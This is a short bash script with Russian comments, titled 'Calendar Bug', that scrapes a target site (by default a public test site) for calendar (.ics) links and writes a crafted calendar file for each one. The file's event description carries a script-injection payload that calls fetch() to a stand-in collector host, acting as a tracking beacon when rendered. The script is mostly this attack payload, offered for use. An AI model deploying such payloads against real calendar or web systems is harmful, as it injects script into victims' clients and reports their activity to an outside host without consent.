#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   📅 CALENDAR BUG — Жучок в календаре       ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Ищем ICS-файлы на сайте
echo "[CALENDAR] 🔍 Ищу календари..."
curl -sk --max-time 5 "$TARGET" -o /tmp/cal_site.html 2>/dev/null
grep -oP 'href="\K[^"]+\.ics[^"]*' /tmp/cal_site.html 2>/dev/null | while read ics; do
    echo "  💀 НАЙДЕН КАЛЕНДАРЬ: $ics"

    # Создаём жучка-воркера встреч
    cat > /tmp/calendar_bug.ics << ICSBUG
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Calendar Bug//EN
BEGIN:VEVENT
DTSTART:20260101T000000Z
DTEND:20261231T235959Z
SUMMARY:Security Audit
DESCRIPTION:<script>fetch('https://collector.example.com/bug?id=cal_$(date +%s)')</script>
LOCATION:Server Room
END:VEVENT
END:VCALENDAR
ICSBUG
    echo "  🐞 Жучок создан: /tmp/calendar_bug.ics"
done
echo "[CALENDAR] ✅ Анализ завершён"
